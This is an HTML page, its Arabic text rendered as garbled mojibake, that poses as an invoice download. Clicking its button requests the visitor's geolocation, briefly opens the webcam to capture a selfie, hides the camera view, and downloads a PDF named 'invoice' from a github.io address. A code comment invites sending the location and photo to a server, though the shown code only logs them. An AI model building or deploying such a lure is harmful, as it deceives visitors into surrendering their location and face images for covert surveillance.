<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>ÙØ§ØªÙˆØ±Ø© + Ø³ÙŠÙ„ÙÙŠ</title>
<style>
body { text-align:center; font-family: sans-serif; margin-top: 50px; }
video, canvas { border: 1px solid black; margin-top: 10px; }
button { margin-top: 10px; padding: 10px 20px; font-size: 16px; }
</style>
</head>
<body>
<h2>Ø§Ø¶ØºØ· Ø§Ù„Ø²Ø± Ù„Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ğŸ“¸ğŸ“</h2>
<button id="start">Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©</button>
<video id="video" width="320" height="240" autoplay style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
<script>
document.getElementById('start').addEventListener('click', async () => {
    // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    let position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    let lat = position.coords.latitude;
    let lon = position.coords.longitude;

    // ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªÙ‚Ø§Ø· Ø³ÙŠÙ„ÙÙŠ
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    video.style.display = 'block';
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;

    // Ù†Ù†ØªØ¸Ø± 3 Ø«ÙˆØ§Ù†ÙŠ Ù‚Ø¨Ù„ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© (ÙŠÙ…ÙƒÙ† ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„ÙˆÙ‚Øª)
    await new Promise(r => setTimeout(r, 3000));
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const selfieData = canvas.toDataURL('image/png');
    stream.getTracks().forEach(track => track.stop());
    video.style.display = 'none';
    canvas.style.display = 'none';

    // ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¨Ø¹Ø¯ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø³ÙŠÙ„ÙÙŠ
    const a = document.createElement('a');
    a.href = 'https://m093rf.github.io/onnop/temp.pdf'; // Ø¶Ø¹ Ù‡Ù†Ø§ Ø±Ø§Ø¨Ø· PDF Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±
    a.download = 'ÙØ§ØªÙˆØ±Ø©.pdf';
    document.body.appendChild(a);
    a.click();

    // Ù‡Ù†Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø³ÙŠØ±ÙØ± Ø¥Ø°Ø§ ØªØ±ÙŠØ¯ Ø­ÙØ¸Ù‡Ø§
    console.log("Latitude:", lat, "Longitude:", lon, "Selfie captured");
});
</script>
</body>
</html>


